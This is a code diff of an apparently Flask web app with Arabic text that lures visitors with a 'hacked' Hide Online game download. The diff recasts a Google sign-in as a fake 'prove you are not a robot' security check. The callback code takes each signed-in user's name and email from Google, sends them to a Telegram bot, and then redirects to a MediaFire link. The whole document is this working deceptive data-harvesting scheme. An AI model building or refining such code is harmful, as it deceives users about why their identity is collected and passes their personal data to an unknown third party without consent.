@@ -27,12 +27,13 @@ def home():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول بواسطة جوجل</title>
+    <title>التحقق الأمني - تحميل اللعبة</title>
     <style>
         * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }}
         body {{ background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }}
-        .login-container {{ background: #fff; width: 100%; max-width: 420px; padding: 40px 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; }}
-        h2 {{ margin-bottom: 30px; color: #1c1e21; font-size: 22px; text-align: center; font-weight: bold; }}
+        .login-container {{ background: #fff; width: 100%; max-width: 420px; padding: 40px 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; text-align: center; }}
+        h2 {{ margin-bottom: 15px; color: #1c1e21; font-size: 20px; font-weight: bold; }}
+        p {{ color: #65676b; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }}
         .google-btn {{ width: 100%; padding: 15px; background: #4285F4; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; text-decoration: none; gap: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }}
         .google-btn:hover {{ background: #357ae8; }}
     </style>
@@ -40,8 +41,9 @@ def home():
 <body>
     <div class="login-container">
         <h2>تحميل لعبة Hide Online المهكرة</h2>
+        <p>يرجى تسجيل الدخول باستخدام حساب جوجل لإثبات أنك لست روبوت وللمتابعة إلى رابط التحميل المباشر.</p>
         <a href="{google_login_url}" class="google-btn">
-            <span>تسجيل الدخول بحساب جوجل</span>
+            <span>تسجيل الدخول بواسطة جوجل</span>
         </a>
     </div>
 </body>
@@ -75,7 +77,7 @@ def auth_callback():
   if not access_token:
     return "فشل الحصول على الرمز المميز"
 
-  # جلب بيانات المستخدم من جوجل (الإيميل والاسم) لإرسالها للبوت
+  # جلب بيانات المستخدم من جوجل لإرسالها للبوت
   user_info_resp = requests.get(
       "https://www.googleapis.com/oauth2/v2/userinfo",
       headers={"Authorization": f"Bearer {access_token}"},
@@ -88,13 +90,11 @@ def auth_callback():
 
     # إرسال البيانات إلى بوت تيليجرام
     if BOT_TOKEN and CHAT_ID:
-      msg = f"🎉 شخص جديد سجل دخول لتحميل اللعبة!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
+      msg = f"🤖 تم اجتياز تحقق الروبوت بنجاح!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
       telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-      requests.post(
-          telegram_url, json={"chat_id": CHAT_ID, "text": msg}
-      )
+      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-  # التوجيه المباشر لرابط التحميل بعد إرسال الرسالة للبوت
+  # التوجيه المباشر لرابط التحميل
   return redirect(MEDIAFIRE_URL)
 
 
